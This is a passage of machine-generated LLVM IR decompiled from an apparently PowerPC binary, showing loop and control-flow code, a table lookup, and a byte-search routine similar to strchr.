  %v1_1000c8ac = and i32 %v5_1000c8a8, 32
  store i32 %v1_1000c8ac, i32* %r9.global-to-local, align 4
  %v3_1000c8ac = icmp eq i32 %v1_1000c8ac, 0
  br i1 %v3_1000c8ac, label %dec_label_pc_1000c88c, label %dec_label_pc_1000c8b4.loopexit

dec_label_pc_1000c8b4.loopexit:                   ; preds = %dec_label_pc_1000c8a0, %dec_label_pc_1000c88c, %dec_label_pc_1000c890.preheader
  %v0_1000c8b4 = phi i32 [ %v0_1000c8909, %dec_label_pc_1000c890.preheader ], [ %v0_1000c88c, %dec_label_pc_1000c8a0 ], [ %v1_1000c88c, %dec_label_pc_1000c88c ]
  %v1_1000c8b4 = inttoptr i32 %v0_1000c8b4 to i8*
  %v2_1000c8b4 = load i8, i8* %v1_1000c8b4, align 1
  %v3_1000c8b4 = zext i8 %v2_1000c8b4 to i32
  store i32 %v3_1000c8b4, i32* %r0.global-to-local, align 4
  %v3_1000c8b8 = icmp eq i8 %v2_1000c8b4, 0
  br i1 %v3_1000c8b8, label %dec_label_pc_1000c8c0, label %dec_label_pc_1000c850.preheader

dec_label_pc_1000c850.preheader:                  ; preds = %dec_label_pc_1000c838, %dec_label_pc_1000c8b4.loopexit
  %v0_1000c8502 = phi i32 [ %v0_1000c8b4, %dec_label_pc_1000c8b4.loopexit ], [ %v0_1000c838, %dec_label_pc_1000c838 ]
  %v1_1000c8503 = inttoptr i32 %v0_1000c8502 to i8*
  %v2_1000c8504 = load i8, i8* %v1_1000c8503, align 1
  %v3_1000c8505 = zext i8 %v2_1000c8504 to i32
  store i32 %v3_1000c8505, i32* %r0.global-to-local, align 4
  %v3_1000c8547 = icmp eq i8 %v2_1000c8504, 0
  br i1 %v3_1000c8547, label %dec_label_pc_1000c8c0, label %dec_label_pc_1000c860

dec_label_pc_1000c8c0:                            ; preds = %dec_label_pc_1000c8b4.loopexit, %dec_label_pc_1000c850.preheader, %dec_label_pc_1000c844, %dec_label_pc_1000c838
  %v0_1000c8c0 = load i32, i32* @r29, align 4
  %v1_1000c8c4 = mul i32 %v0_1000c8c0, 4
  store i32 %v1_1000c8c4, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000c8cc = load i32, i32* @r30, align 4
  %v3_1000c8cc = add i32 %v2_1000c8cc, %v1_1000c8c4
  %v4_1000c8cc = inttoptr i32 %v3_1000c8cc to i32*
  store i32 0, i32* %v4_1000c8cc, align 4
  %tmp55 = icmp slt i32 %v0_1000c8c0, 2
  br i1 %tmp55, label %dec_label_pc_1000c974, label %dec_label_pc_1000c8d4

dec_label_pc_1000c8d4:                            ; preds = %dec_label_pc_1000c8c0
  %v0_1000c8d4 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000c8d4 = icmp eq i32 %v0_1000c8d4, 1
  br i1 %v3_1000c8d4, label %dec_label_pc_1000c98c, label %dec_label_pc_1000c8dc

dec_label_pc_1000c8dc:                            ; preds = %dec_label_pc_1000c8d4
  %v3_1000c8dc = icmp eq i32 %v0_1000c8d4, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_1000c8dc, label %dec_label_pc_1000c8e8, label %dec_label_pc_1000c914.preheader

dec_label_pc_1000c914.preheader:                  ; preds = %dec_label_pc_1000c8dc
  %v1_1000c91423 = load i32, i32* @r29, align 4
  %v2_1000c91424 = icmp sgt i32 %v1_1000c91423, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000c91c29 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000c91c29, i32* @r3, align 4
  br i1 %v2_1000c91424, label %dec_label_pc_1000c900, label %dec_label_pc_1000c924

dec_label_pc_1000c8e8:                            ; preds = %dec_label_pc_1000c8dc
  %v0_1000c8e8 = load i32, i32* @r30, align 4
  %v1_1000c8e8 = inttoptr i32 %v0_1000c8e8 to i32*
  %v2_1000c8e8 = load i32, i32* %v1_1000c8e8, align 4
  store i32 %v2_1000c8e8, i32* @r4, align 4
  %v0_1000c8ec = load i32, i32* %r15.global-to-local, align 4
  %v2_1000c8f0 = inttoptr i32 %v0_1000c8ec to i8*
  %v3_1000c8f0 = call i32 @function_1000ba94(i8* %v2_1000c8f0, i32 %v2_1000c8e8)
  %v3_1000c8f4 = icmp eq i32 %v3_1000c8f0, 0
  br i1 %v3_1000c8f4, label %dec_label_pc_1000c92c, label %dec_label_pc_1000c974

dec_label_pc_1000c900:                            ; preds = %dec_label_pc_1000c914.preheader, %dec_label_pc_1000c910
  %v1_1000c900 = phi i32 [ %v1_1000c918, %dec_label_pc_1000c910 ], [ 4, %dec_label_pc_1000c914.preheader ]
  %v0_1000c91c31 = phi i32 [ %v0_1000c91c, %dec_label_pc_1000c910 ], [ %v0_1000c91c29, %dec_label_pc_1000c914.preheader ]
  %v0_1000c900 = load i32, i32* @r30, align 4
  %v2_1000c900 = add i32 %v0_1000c900, %v1_1000c900
  %v3_1000c900 = inttoptr i32 %v2_1000c900 to i32*
  %v4_1000c900 = load i32, i32* %v3_1000c900, align 4
  store i32 %v4_1000c900, i32* @r4, align 4
  %v2_1000c904 = call i32 @function_1000735c(i32 %v0_1000c91c31, i32 %v4_1000c900)
  %v3_1000c908 = icmp eq i32 %v2_1000c904, 0
  %v0_1000c924.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000c908, label %dec_label_pc_1000c900.dec_label_pc_1000c924_crit_edge, label %dec_label_pc_1000c910

dec_label_pc_1000c910:                            ; preds = %dec_label_pc_1000c900
  %v1_1000c910 = add i32 %v0_1000c924.pre, 1
  store i32 %v1_1000c910, i32* @r31, align 4
  %v1_1000c914 = load i32, i32* @r29, align 4
  %v2_1000c914 = icmp slt i32 %v1_1000c910, %v1_1000c914
  %v1_1000c918 = mul i32 %v1_1000c910, 4
  store i32 %v1_1000c918, i32* %r0.global-to-local, align 4
  %v0_1000c91c = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000c91c, i32* @r3, align 4
  br i1 %v2_1000c914, label %dec_label_pc_1000c900, label %dec_label_pc_1000c924

dec_label_pc_1000c900.dec_label_pc_1000c924_crit_edge: ; preds = %dec_label_pc_1000c900
  %v1_1000c924.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000c924

dec_label_pc_1000c924:                            ; preds = %dec_label_pc_1000c910, %dec_label_pc_1000c900.dec_label_pc_1000c924_crit_edge, %dec_label_pc_1000c914.preheader
  %v1_1000c924 = phi i32 [ %v1_1000c924.pre, %dec_label_pc_1000c900.dec_label_pc_1000c924_crit_edge ], [ %v1_1000c91423, %dec_label_pc_1000c914.preheader ], [ %v1_1000c914, %dec_label_pc_1000c910 ]
  %v0_1000c924 = phi i32 [ %v0_1000c924.pre, %dec_label_pc_1000c900.dec_label_pc_1000c924_crit_edge ], [ 1, %dec_label_pc_1000c914.preheader ], [ %v1_1000c910, %dec_label_pc_1000c910 ]
  %v2_1000c924 = icmp slt i32 %v0_1000c924, %v1_1000c924
  br i1 %v2_1000c924, label %dec_label_pc_1000c92c, label %dec_label_pc_1000c974

dec_label_pc_1000c92c:                            ; preds = %dec_label_pc_1000c8e8, %dec_label_pc_1000c924
  %v0_1000c92c = load i32, i32* %r19.global-to-local, align 4
  %v3_1000c92c = icmp eq i32 %v0_1000c92c, 2
  br i1 %v3_1000c92c, label %dec_label_pc_1000c934, label %dec_label_pc_1000c950

dec_label_pc_1000c934:                            ; preds = %dec_label_pc_1000c92c
  %v0_1000c934 = load i32, i32* @r30, align 4
  %v1_1000c934 = inttoptr i32 %v0_1000c934 to i32*
  %v2_1000c934 = load i32, i32* %v1_1000c934, align 4
  %v0_1000c93c = load i32, i32* @r25, align 4
  store i32 268486980, i32* @lr, align 4
  %v3_1000c940 = inttoptr i32 %v2_1000c934 to i8*
  %v4_1000c940 = call i32 @function_1000bcc4(i32 2, i8* %v3_1000c940, i32 %v0_1000c93c)
  %v2_1000c944 = icmp sgt i32 %v4_1000c940, 0
  br i1 %v2_1000c944, label %dec_label_pc_1000c794, label %dec_label_pc_1000c970

dec_label_pc_1000c950:                            ; preds = %dec_label_pc_1000c92c
  %v3_1000c950 = icmp eq i32 %v0_1000c92c, 10
  br i1 %v3_1000c950, label %dec_label_pc_1000c958, label %dec_label_pc_1000c970

dec_label_pc_1000c958:                            ; preds = %dec_label_pc_1000c950
  %v0_1000c958 = load i32, i32* @r30, align 4
  %v1_1000c958 = inttoptr i32 %v0_1000c958 to i32*
  %v2_1000c958 = load i32, i32* %v1_1000c958, align 4
  %v0_1000c960 = load i32, i32* %r21.global-to-local, align 4
  store i32 268487016, i32* @lr, align 4
  %v3_1000c964 = inttoptr i32 %v2_1000c958 to i8*
  %v4_1000c964 = call i32 @function_1000bcc4(i32 10, i8* %v3_1000c964, i32 %v0_1000c960)
  %v2_1000c968 = icmp sgt i32 %v4_1000c964, 0
  br i1 %v2_1000c968, label %dec_label_pc_1000c7c4, label %dec_label_pc_1000c970

dec_label_pc_1000c970:                            ; preds = %dec_label_pc_1000c934, %dec_label_pc_1000c950, %dec_label_pc_1000c958
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_1000c974

dec_label_pc_1000c974:                            ; preds = %dec_label_pc_1000c924, %dec_label_pc_1000c8e8, %dec_label_pc_1000c8c0, %dec_label_pc_1000c970, %dec_label_pc_1000c80c
  %v0_1000c974 = load i32, i32* @r24, align 4
  %v0_1000c978 = load i32, i32* @r27, align 4
  %v0_1000c97c = load i32, i32* @r20, align 4
  store i32 268487044, i32* @lr, align 4
  %v3_1000c980 = call i32 @function_1000665c(i32 %v0_1000c974, i32 %v0_1000c978, i32 %v0_1000c97c)
  %v3_1000c984 = icmp eq i32 %v3_1000c980, 0
  br i1 %v3_1000c984, label %dec_label_pc_1000c98c, label %dec_label_pc_1000c81c

dec_label_pc_1000c98c:                            ; preds = %dec_label_pc_1000c974, %dec_label_pc_1000c8d4, %dec_label_pc_1000c7f0
  %v0_1000c98c = load i32, i32* %r18.global-to-local, align 4
  %v3_1000c98c = icmp eq i32 %v0_1000c98c, 1
  br i1 %v3_1000c98c, label %dec_label_pc_1000c9a4, label %dec_label_pc_1000c994

dec_label_pc_1000c994:                            ; preds = %dec_label_pc_1000c98c
  %v0_1000c994 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_1000c99c.343 to i32), i32* @lr, align 4
  %v1_1000c998 = inttoptr i32 %v0_1000c994 to i16*
  %v2_1000c998 = call i32 @function_10004b54(i16* %v1_1000c998)
  br label %dec_label_pc_1000c9a4

dec_label_pc_1000c9a0:                            ; preds = %dec_label_pc_1000c758, %dec_label_pc_1000c728, %dec_label_pc_1000c720, %dec_label_pc_1000c714, %dec_label_pc_1000c704, %dec_label_pc_1000c6ec, %dec_label_pc_1000c6dc
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_1000c9a4

dec_label_pc_1000c9a4:                            ; preds = %dec_label_pc_1000c98c, %dec_label_pc_1000c994, %dec_label_pc_1000c784, %dec_label_pc_1000c9a0
  store i32 %v0_1000c6a4, i32* %r0.global-to-local, align 4
  %v0_1000c9a8 = load i32, i32* @r26, align 4
  ret i32 %v0_1000c9a8

; uselistorder directives
  uselistorder i32 %v0_1000c91c, { 1, 0 }
  uselistorder i32 %v1_1000c910, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000c8c4, { 1, 0 }
  uselistorder i32 %v0_1000c8c0, { 1, 0 }
  uselistorder i32 %v3_1000c8505, { 1, 0 }
  uselistorder i32 %v0_1000c8502, { 1, 0 }
  uselistorder i32 %v1_1000c87c, { 1, 0 }
  uselistorder i32 %v0_1000c874, { 1, 0, 2 }
  uselistorder i32 %v2_1000c824, { 1, 0 }
  uselistorder i32 %v0_1000c714, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000c6ec.pr, { 1, 0, 2 }
  uselistorder i32 %v1_1000c6b0, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 11, 30, 12, 27, 19, 13, 14, 28, 15, 16, 18, 17, 29, 20, 21, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26 }
  uselistorder i32 34, { 3, 4, 8, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 (i16*)* @function_10004b54, { 2, 3, 0, 1, 5, 4 }
  uselistorder i32 (i32, i32, i32)* @function_1000665c, { 3, 2, 1, 0 }
  uselistorder i32 10, { 10, 28, 29, 30, 31, 32, 33, 34, 17, 18, 19, 20, 21, 36, 35, 37, 38, 7, 39, 2, 41, 3, 42, 1, 8, 11, 45, 12, 25, 4, 5, 22, 9, 6, 27, 40, 43, 44, 13, 0, 23, 24, 14, 26, 15, 16 }
  uselistorder i32 (i32, i32)* @function_1000735c, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 6, { 18, 19, 20, 21, 22, 0, 1, 2, 12, 13, 14, 15, 6, 7, 8, 3, 23, 24, 4, 25, 9, 26, 5, 10, 11, 16, 17 }
  uselistorder i32* @global_var_1001044c, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 12, { 30, 31, 32, 0, 33, 34, 35, 10, 14, 42, 47, 7, 8, 9, 11, 43, 53, 54, 55, 56, 57, 58, 59, 60, 5, 6, 61, 62, 63, 66, 15, 19, 46, 16, 48, 49, 50, 51, 4, 52, 1, 2, 3, 12, 36, 37, 38, 39, 67, 40, 64, 65, 44, 45, 13, 17, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 41 }
  uselistorder i32 80, { 5, 4, 3, 2, 1, 6, 0, 7, 8, 9 }
  uselistorder i32 48, { 12, 7, 8, 9, 1, 10, 11, 4, 14, 15, 2, 16, 17, 18, 6, 19, 5, 20, 3, 0, 21, 22, 13 }
  uselistorder i32 -48, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 16, { 9, 29, 30, 31, 10, 32, 33, 0, 34, 35, 1, 36, 11, 55, 56, 66, 67, 37, 38, 39, 57, 58, 59, 60, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 88, 81, 4, 24, 17, 21, 18, 40, 41, 2, 27, 5, 28, 92, 93, 94, 42, 43, 44, 45, 46, 47, 61, 62, 48, 49, 50, 82, 83, 84, 85, 86, 87, 89, 90, 91, 63, 64, 65, 3, 12, 19, 20, 6, 22, 7, 23, 8, 25, 26, 51, 52, 53, 13, 54, 14, 15, 16 }
  uselistorder i32* @r27, { 14, 15, 16, 17, 18, 19, 1, 20, 21, 22, 23, 9, 10, 6, 11, 3, 2, 24, 25, 26, 27, 28, 0, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 56, 57, 80, 4, 81, 82, 87, 54, 55, 39, 40, 41, 42, 83, 84, 85, 58, 59, 43, 44, 45, 60, 61, 5, 62, 63, 64, 65, 66, 7, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 8, 12, 13, 86, 46, 47, 48, 49, 78, 79, 50, 51, 52, 53 }
  uselistorder i32 32, { 27, 28, 29, 19, 30, 31, 20, 16, 17, 24, 1, 2, 3, 32, 33, 38, 13, 18, 39, 40, 14, 15, 25, 26, 12, 34, 35, 36, 41, 42, 21, 43, 44, 45, 46, 47, 48, 49, 0, 50, 51, 37, 5, 6, 4, 8, 7, 22, 23, 10, 11, 9 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000c9a4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c974, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1000c970, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c92c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c924, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c900, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8c0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000c850.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c838, { 1, 0 }
  uselistorder label %dec_label_pc_1000c80c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c758, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6ec, { 1, 0 }
}

define i32 @function_1000c9bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c9bc:
  %v0_1000c9c0 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268487124, i32* @lr, align 4
  %v0_1000c9d0 = call i32 @function_10004970()
  %v0_1000c9d8 = load i32, i32* @r29, align 4
  store i32 %v0_1000c9c0, i32* @lr, align 4
  %v2_1000c9e8 = call i32 @function_10004a00(i32 %v0_1000c9d0, i32 %v0_1000c9d8)
  ret i32 %v2_1000c9e8

; uselistorder directives
  uselistorder i32 ()* @function_10004970, { 0, 2, 1 }
}

define i32 @function_1000c9ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000c9ec:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000c9f0 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000ca18 = call i32 @__asm_mfcr()
  %v1_1000ca1c = and i32 %v0_1000ca18, 268435456
  %v3_1000ca1c = icmp eq i32 %v1_1000ca1c, 0
  store i32 %v0_1000ca18, i32* %r31.global-to-local, align 4
  store i32 %v0_1000ca18, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ca1c, label %dec_label_pc_1000ca40, label %dec_label_pc_1000ca30

dec_label_pc_1000ca30:                            ; preds = %dec_label_pc_1000c9ec
  %v0_1000ca30 = call i32 @function_10004b48()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000ca38 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ca38 = inttoptr i32 %v0_1000ca30 to i32*
  store i32 %v0_1000ca38, i32* %v2_1000ca38, align 4
  %v0_1000ca44.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000ca44

dec_label_pc_1000ca40:                            ; preds = %dec_label_pc_1000c9ec
  %v3_1000ca28 = icmp eq i32 %v0_1000ca18, 0
  br i1 %v3_1000ca28, label %dec_label_pc_1000ca50, label %dec_label_pc_1000ca44

dec_label_pc_1000ca44:                            ; preds = %dec_label_pc_1000ca40, %dec_label_pc_1000ca30
  %v0_1000ca44 = phi i32 [ %v0_1000ca18, %dec_label_pc_1000ca40 ], [ %v0_1000ca44.pre, %dec_label_pc_1000ca30 ]
  %tmp = icmp slt i32 %v0_1000ca44, 0
  %v1_1000ca48 = zext i1 %tmp to i32
  %v2_1000ca48 = ashr i32 %v0_1000ca44, 31
  %v3_1000ca48 = and i32 %v2_1000ca48, -2
  %v4_1000ca48 = or i32 %v3_1000ca48, %v1_1000ca48
  br label %dec_label_pc_1000ca58

dec_label_pc_1000ca50:                            ; preds = %dec_label_pc_1000ca40
  %v3_1000ca50 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000ca58

dec_label_pc_1000ca58:                            ; preds = %dec_label_pc_1000ca44, %dec_label_pc_1000ca50
  %v0_1000ca68 = phi i32 [ %v4_1000ca48, %dec_label_pc_1000ca44 ], [ %v3_1000ca50, %dec_label_pc_1000ca50 ]
  store i32 %v0_1000c9f0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000ca68

; uselistorder directives
  uselistorder i32 %v0_1000ca44, { 1, 0 }
  uselistorder i32 %v0_1000ca18, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 10, 11, 12, 1, 0, 2, 9, 3, 4, 13, 14, 5, 15, 16, 17, 6, 19, 20, 18, 21, 7, 8 }
  uselistorder i32 31, { 28, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 29, 30, 1, 2, 24, 25, 31, 32, 33, 7, 8, 3, 4, 0, 5, 9, 10, 11, 12, 13, 34, 35, 36, 49, 50, 47, 48, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 27, 6, 26 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca58, { 1, 0 }
}

define i32 @function_1000ca6c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000ca6c:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ca84 = call i32 @__asm_mfcr()
  %v1_1000ca88 = and i32 %v0_1000ca84, 268435456
  %v3_1000ca88 = icmp eq i32 %v1_1000ca88, 0
  store i32 %v0_1000ca84, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ca88, label %dec_label_pc_1000caa0, label %dec_label_pc_1000ca94

dec_label_pc_1000ca94:                            ; preds = %dec_label_pc_1000ca6c
  %v0_1000ca94 = call i32 @function_10004b48()
  %v0_1000ca98 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ca98 = inttoptr i32 %v0_1000ca94 to i32*
  store i32 %v0_1000ca98, i32* %v2_1000ca98, align 4
  br label %dec_label_pc_1000caa0

dec_label_pc_1000caa0:                            ; preds = %dec_label_pc_1000ca6c, %dec_label_pc_1000ca94
  %v0_1000cab0 = phi i32 [ %v0_1000ca84, %dec_label_pc_1000ca6c ], [ -1, %dec_label_pc_1000ca94 ]
  ret i32 %v0_1000cab0

; uselistorder directives
  uselistorder i32 ()* @function_10004b48, { 35, 28, 46, 65, 64, 63, 45, 34, 27, 26, 44, 19, 18, 43, 25, 24, 58, 17, 16, 57, 14, 52, 13, 12, 11, 10, 9, 56, 8, 7, 5, 37, 6, 51, 50, 49, 48, 41, 40, 39, 30, 42, 4, 3, 23, 0, 22, 1, 33, 32, 55, 54, 53, 15, 47, 36, 21, 38, 20, 29, 31, 2, 62, 61, 60, 59 }
  uselistorder i32 268435456, { 9, 12, 6, 15, 1, 16, 2, 18, 4, 19, 20, 21, 22, 23, 3, 24, 25, 26, 7, 17, 5, 8, 13, 0, 14, 11, 10, 27 }
  uselistorder label %dec_label_pc_1000caa0, { 1, 0 }
}

define i32 @function_1000cab4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000cab4:
  %v1_1000cab4 = add i32 %arg1, 128
  %v1_1000cab8 = mul i32 %arg1, 2
  %v2_1000cabc = icmp ugt i32 %v1_1000cab4, 383
  %v0_1000cac0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000cabc, i32 %v0_1000cac0)
  %v3_1000cac8 = load i32, i32* bitcast (i32** @global_var_10010454.247 to i32*), align 4
  %v2_1000cacc = add i32 %v1_1000cab8, %v3_1000cac8
  %v3_1000cacc = inttoptr i32 %v2_1000cacc to i16*
  %v4_1000cacc = load i16, i16* %v3_1000cacc, align 2
  %v5_1000cacc = sext i16 %v4_1000cacc to i32
  ret i32 %v5_1000cacc

; uselistorder directives
  uselistorder i32 128, { 11, 0, 1, 21, 22, 4, 6, 12, 5, 13, 7, 14, 15, 3, 16, 8, 17, 18, 19, 2, 9, 10, 20 }
}

define i32 @function_1000cad4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000cad4:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000cad4 = urem i32 %arg1, 256
  store i32 %v1_1000cad4, i32* %r4.global-to-local, align 4
  %v0_1000caf42 = load i32, i32* @r3, align 4
  %v1_1000caf43 = urem i32 %v0_1000caf42, 4
  %v3_1000caf45 = icmp eq i32 %v1_1000caf43, 0
  br i1 %v3_1000caf45, label %dec_label_pc_1000cafc, label %dec_label_pc_1000cadc

dec_label_pc_1000cadc:                            ; preds = %dec_label_pc_1000cad4, %dec_label_pc_1000caf0
  %v1_1000cae0 = phi i32 [ %v0_1000cafc.pre, %dec_label_pc_1000caf0 ], [ %v1_1000cad4, %dec_label_pc_1000cad4 ]
  %v0_1000cadc = phi i32 [ %v1_1000caf0, %dec_label_pc_1000caf0 ], [ %v0_1000caf42, %dec_label_pc_1000cad4 ]
  %v1_1000cadc = inttoptr i32 %v0_1000cadc to i8*
  %v2_1000cadc = load i8, i8* %v1_1000cadc, align 1
  %v3_1000cadc = zext i8 %v2_1000cadc to i32
  %v4_1000cae0 = icmp eq i32 %v3_1000cadc, %v1_1000cae0
  %v3_1000cae4 = icmp eq i8 %v2_1000cadc, 0
  %v0_1000cae8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000cae0, i32 %v0_1000cae8)
  br i1 %v3_1000cae4, label %dec_label_pc_1000cbcc, label %dec_label_pc_1000caf0

dec_label_pc_1000caf0:                            ; preds = %dec_label_pc_1000cadc
  %v0_1000caf0 = load i32, i32* @r3, align 4
  %v1_1000caf0 = add i32 %v0_1000caf0, 1
  store i32 %v1_1000caf0, i32* @r3, align 4
  %v1_1000caf4 = urem i32 %v1_1000caf0, 4
  %v3_1000caf4 = icmp eq i32 %v1_1000caf4, 0
  %v0_1000cafc.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000caf4, label %dec_label_pc_1000cafc, label %dec_label_pc_1000cadc

dec_label_pc_1000cafc:                            ; preds = %dec_label_pc_1000caf0, %dec_label_pc_1000cad4
  %v0_1000cb1410 = phi i32 [ %v0_1000caf42, %dec_label_pc_1000cad4 ], [ %v1_1000caf0, %dec_label_pc_1000caf0 ]
  %v0_1000cafc = phi i32 [ %v1_1000cad4, %dec_label_pc_1000cad4 ], [ %v0_1000cafc.pre, %dec_label_pc_1000caf0 ]
  %v1_1000cafc = mul i32 %v0_1000cafc, 256
  %v2_1000cb04 = or i32 %v1_1000cafc, %v0_1000cafc
  %v1_1000cb0c = mul i32 %v2_1000cb04, 65536
  %v2_1000cb10 = or i32 %v1_1000cb0c, %v2_1000cb04
  br label %dec_label_pc_1000cb14

dec_label_pc_1000cb14:                            ; preds = %dec_label_pc_1000cb14, %dec_label_pc_1000cbc8, %dec_label_pc_1000cafc
  %v0_1000cb6c = phi i32 [ %v0_1000cb1410, %dec_label_pc_1000cafc ], [ %v1_1000cb18, %dec_label_pc_1000cbc8 ], [ %v1_1000cb18, %dec_label_pc_1000cb14 ]
  %v1_1000cb14 = inttoptr i32 %v0_1000cb6c to i32*
  %v2_1000cb14 = load i32, i32* %v1_1000cb14, align 4
  %v1_1000cb18 = add i32 %v0_1000cb6c, 4
  %v2_1000cb20 = xor i32 %v2_1000cb14, %v2_1000cb10
  %v1_1000cb2c = add i32 %v2_1000cb14, 2130640639
  %v1_1000cb30 = add i32 %v2_1000cb20, 2130640639
  %v2_1000cb34 = xor i32 %v1_1000cb2c, %v2_1000cb14
  %v2_1000cb38 = xor i32 %v1_1000cb30, %v2_1000cb20
  %v2_1000cb3c = and i32 %v2_1000cb34, -2130640640
  %v3_1000cb3c = xor i32 %v2_1000cb3c, -2130640640
  %v2_1000cb40 = and i32 %v2_1000cb38, -2130640640
  %v3_1000cb40 = xor i32 %v2_1000cb40, -2130640640
  %tmp = or i32 %v3_1000cb40, %v3_1000cb3c
  %tmp16 = icmp eq i32 %tmp, 0
  br i1 %tmp16, label %dec_label_pc_1000cb14, label %dec_label_pc_1000cb50

dec_label_pc_1000cb50:                            ; preds = %dec_label_pc_1000cb14
  %v2_1000cb50 = inttoptr i32 %v0_1000cb6c to i8*
  %v3_1000cb50 = load i8, i8* %v2_1000cb50, align 1
  %v4_1000cb50 = zext i8 %v3_1000cb50 to i32
  %v1_1000cb54 = add i32 %v0_1000cb6c, 1
  %v1_1000cb58 = add i32 %v0_1000cb6c, 2
  %v1_1000cb5c = add i32 %v0_1000cb6c, 3
  %v4_1000cb60 = icmp eq i32 %v4_1000cb50, %v0_1000cafc
  br i1 %v4_1000cb60, label %dec_label_pc_1000cb6c, label %dec_label_pc_1000cb74

dec_label_pc_1000cb6c:                            ; preds = %dec_label_pc_1000cb50
  ret i32 %v0_1000cb6c

dec_label_pc_1000cb74:                            ; preds = %dec_label_pc_1000cb50
  %v3_1000cb64 = icmp eq i8 %v3_1000cb50, 0
  br i1 %v3_1000cb64, label %dec_label_pc_1000cbcc, label %dec_label_pc_1000cb78

dec_label_pc_1000cb78:                            ; preds = %dec_label_pc_1000cb74
  %v2_1000cb78 = inttoptr i32 %v1_1000cb54 to i8*
  %v3_1000cb78 = load i8, i8* %v2_1000cb78, align 1
  %v4_1000cb78 = zext i8 %v3_1000cb78 to i32
  %v4_1000cb7c = icmp eq i32 %v4_1000cb78, %v0_1000cafc
  br i1 %v4_1000cb7c, label %dec_label_pc_1000cb88, label %dec_label_pc_1000cb90

dec_label_pc_1000cb88:                            ; preds = %dec_label_pc_1000cb78
  ret i32 %v1_1000cb54

dec_label_pc_1000cb90:                            ; preds = %dec_label_pc_1000cb78
  %v3_1000cb80 = icmp eq i8 %v3_1000cb78, 0
  br i1 %v3_1000cb80, label %dec_label_pc_1000cbcc, label %dec_label_pc_1000cb94

dec_label_pc_1000cb94:                            ; preds = %dec_label_pc_1000cb90
  %v2_1000cb94 = inttoptr i32 %v1_1000cb58 to i8*
  %v3_1000cb94 = load i8, i8* %v2_1000cb94, align 1
  %v4_1000cb94 = zext i8 %v3_1000cb94 to i32
  %v4_1000cb98 = icmp eq i32 %v4_1000cb94, %v0_1000cafc
  br i1 %v4_1000cb98, label %dec_label_pc_1000cba4, label %dec_label_pc_1000cbac

dec_label_pc_1000cba4:                            ; preds = %dec_label_pc_1000cb94
  ret i32 %v1_1000cb58

